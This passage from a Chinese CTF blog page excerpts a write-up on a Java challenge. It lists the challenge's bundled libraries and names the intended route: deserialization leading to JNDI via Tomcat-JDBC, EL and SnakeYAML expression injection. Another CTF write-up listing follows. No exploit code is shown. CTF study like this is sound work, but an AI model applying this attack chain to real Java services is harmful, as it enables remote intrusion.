</code></pre><p>表面上是给了个JDBC的入口，但是我们能控的只有username和password，打不了jdbc。</p>
<p>实际入口是那个反序列化，从这个反序列化里面做文章</p>
<p>然后看看题目给的依赖</p>
<pre tabindex="0"><code>- &#34;BOOT-INF/lib/spring-boot-3.3.5.jar&#34;
- &#34;BOOT-INF/lib/spring-boot-autoconfigure-3.3.5.jar&#34;
- &#34;BOOT-INF/lib/logback-classic-1.5.11.jar&#34;
- &#34;BOOT-INF/lib/logback-core-1.5.11.jar&#34;
- &#34;BOOT-INF/lib/log4j-to-slf4j-2.23.1.jar&#34;
- &#34;BOOT-INF/lib/log4j-api-2.23.1.jar&#34;
- &#34;BOOT-INF/lib/jul-to-slf4j-2.0.16.jar&#34;
- &#34;BOOT-INF/lib/jakarta.annotation-api-2.1.1.jar&#34;
- &#34;BOOT-INF/lib/snakeyaml-2.2.jar&#34;
- &#34;BOOT-INF/lib/jackson-databind-2.17.2.jar&#34;
- &#34;BOOT-INF/lib/jackson-annotations-2.17.2.jar&#34;
- &#34;BOOT-INF/lib/jackson-core-2.17.2.jar&#34;
- &#34;BOOT-INF/lib/jackson-datatype-jdk8-2.17.2.jar&#34;
- &#34;BOOT-INF/lib/jackson-datatype-jsr310-2.17.2.jar&#34;
- &#34;BOOT-INF/lib/jackson-module-parameter-names-2.17.2.jar&#34;
- &#34;BOOT-INF/lib/tomcat-embed-core-10.1.31.jar&#34;
- &#34;BOOT-INF/lib/tomcat-embed-el-10.1.31.jar&#34;
- &#34;BOOT-INF/lib/tomcat-embed-websocket-10.1.31.jar&#34;
- &#34;BOOT-INF/lib/spring-web-6.1.14.jar&#34;
- &#34;BOOT-INF/lib/spring-beans-6.1.14.jar&#34;
- &#34;BOOT-INF/lib/micrometer-observation-1.13.6.jar&#34;
- &#34;BOOT-INF/lib/micrometer-commons-1.13.6.jar&#34;
- &#34;BOOT-INF/lib/spring-webmvc-6.1.14.jar&#34;
- &#34;BOOT-INF/lib/spring-aop-6.1.14.jar&#34;
- &#34;BOOT-INF/lib/spring-context-6.1.14.jar&#34;
- &#34;BOOT-INF/lib/spring-expression-6.1.14.jar&#34;
- &#34;BOOT-INF/lib/thymeleaf-spring6-3.1.2.RELEASE.jar&#34;
- &#34;BOOT-INF/lib/thymeleaf-3.1.2.RELEASE.jar&#34;
- &#34;BOOT-INF/lib/attoparser-2.0.7.RELEASE.jar&#34;
- &#34;BOOT-INF/lib/unbescape-1.1.6.RELEASE.jar&#34;
- &#34;BOOT-INF/lib/slf4j-api-2.0.16.jar&#34;
- &#34;BOOT-INF/lib/spring-core-6.1.14.jar&#34;
- &#34;BOOT-INF/lib/spring-jcl-6.1.14.jar&#34;
- &#34;BOOT-INF/lib/ojdbc11-21.14.0.0.jar&#34;
- &#34;BOOT-INF/lib/tomcat-jdbc-10.1.31.jar&#34;
- &#34;BOOT-INF/lib/tomcat-juli-10.1.31.jar&#34;
- &#34;BOOT-INF/lib/batik-swing-1.14.jar&#34;
- &#34;BOOT-INF/lib/batik-anim-1.14.jar&#34;
- &#34;BOOT-INF/lib/batik-parser-1.14.jar&#34;
- &#34;BOOT-INF/lib/batik-svg-dom-1.14.jar&#34;
- &#34;BOOT-INF/lib/batik-awt-util-1.14.jar&#34;
- &#34;BOOT-INF/lib/xmlgraphics-commons-2.6.jar&#34;
- &#34;BOOT-INF/lib/commons-io-1.3.1.jar&#34;
- &#34;BOOT-INF/lib/commons-logging-1.0.4.jar&#34;
- &#34;BOOT-INF/lib/batik-bridge-1.14.jar&#34;
- &#34;BOOT-INF/lib/batik-xml-1.14.jar&#34;
- &#34;BOOT-INF/lib/batik-css-1.14.jar&#34;
- &#34;BOOT-INF/lib/batik-dom-1.14.jar&#34;
- &#34;BOOT-INF/lib/xalan-2.7.2.jar&#34;
- &#34;BOOT-INF/lib/serializer-2.7.2.jar&#34;
- &#34;BOOT-INF/lib/xml-apis-1.4.01.jar&#34;
- &#34;BOOT-INF/lib/batik-ext-1.14.jar&#34;
- &#34;BOOT-INF/lib/batik-gui-util-1.14.jar&#34;
- &#34;BOOT-INF/lib/batik-gvt-1.14.jar&#34;
- &#34;BOOT-INF/lib/batik-script-1.14.jar&#34;
- &#34;BOOT-INF/lib/batik-shared-resources-1.14.jar&#34;
- &#34;BOOT-INF/lib/batik-util-1.14.jar&#34;
- &#34;BOOT-INF/lib/batik-constants-1.14.jar&#34;
- &#34;BOOT-INF/lib/batik-i18n-1.14.jar&#34;
- &#34;BOOT-INF/lib/xml-apis-ext-1.3.04.jar&#34;
- &#34;BOOT-INF/lib/fastjson2-2.0.37.jar&#34;
- &#34;BOOT-INF/lib/spring-boot-jarmode-tools-3.3.5.jar&#34;
</code></pre><p>有tomcat-jdbc,snakeYaml,EL,Jackson和fastjson2等等，题目指向性很强，就是让我们用一个JNDI通过Tomcat-JDBC打EL，snakeYaml表达式注入的操作</p>
        </div>
        
        <div class="post-time-container">
          <span class="post-time"> 2025-01-20 </span>
        </div>
      </div>
      
    </div>
  </div>
</article>

    
        <article class="post">
  <div class="single-container column is-centered">
    <div class="archive" id="post-container">
      <header class="post-header">
        <h1 class="post-title hover-underline-animation"><a class="post-link" href="/post/2025suctf/">2025-SUCTF-WP</a></h1>
       
       
      </header>
      <div class="post-content">
        <div class="excerpt post-summary">
          2025年的第一场XCTF
        </div>
        
        <div class="post-time-container">
          <span class="post-time"> 2025-01-18 </span>
        </div>
      </div>
      
    </div>
  </div>
</article>

    
    <hr>
<section class="pagination" >
    
    <label class="pag-link">Page 1 of 1</label>
    
</section>

</div>

        </main><footer class="footer">
    <div class="content has-text-centered">
    <span>&copy; 2025 <a href="http://localhost:1313/">GSBP&#39;s Blog</a></span>
    
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
    
    <span>
        Powered by
        <a href="https://gohugo.io/" target="_blank">Hugo</a> &
        <a href="https://github.com/hotjuicew/hugo-JuiceBar" target="_blank">JuiceBar</a>
    </span>
    </div>
  </footer>
</body>
</html>

